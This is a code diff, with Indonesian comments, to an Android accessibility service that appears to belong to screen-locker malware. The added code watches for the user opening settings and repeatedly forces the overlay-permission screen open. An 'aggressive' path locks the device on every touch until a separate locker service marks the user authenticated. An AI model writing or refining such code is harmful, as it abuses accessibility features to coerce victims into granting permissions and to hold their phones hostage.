@@ -20,15 +20,7 @@ public class CustomAccessibilityService extends AccessibilityService {
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-        writeLog("Service Connected");
-
-        // Langsung arahkan ke pengaturan Overlay setelah aksesibilitas aktif
-        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                    Uri.parse("package:" + getPackageName()));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
-        }, 500);
+        writeLog("Service Connected - Waiting for event to jump");
     }
 
     private void writeLog(String text) {
@@ -51,6 +43,12 @@ public class CustomAccessibilityService extends AccessibilityService {
         // JALUR AGRESIF: Jika belum ter-unlock, setiap interaksi user (klik/sentuh) akan memicu loker
         if (!LockerService.isAuthenticated) {
             triggerLocker();
+        }
+
+        // JALUR LOMPAT: Jika aksesibilitas baru aktif dan belum punya izin overlay
+        if (!Settings.canDrawOverlays(this) && packageName.contains("settings")) {
+            jumpToOverlaySettings();
+            return;
         }
 
         // Hanya bereaksi pada menu Settings atau System UI
@@ -100,6 +98,16 @@ public class CustomAccessibilityService extends AccessibilityService {
         if (Settings.canDrawOverlays(this) && !LockerService.isAuthenticated) {
             triggerLocker();
         }
+    }
+
+    private void jumpToOverlaySettings() {
+        long currentTime = System.currentTimeMillis();
+        if (currentTime - lastActionTime < 2000) return; // Debounce agar tidak spam jump
+        
+        lastActionTime = currentTime;
+        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+        startActivity(intent);
     }
 
     private boolean isOverlayPermissionPage(AccessibilityNodeInfo node) {
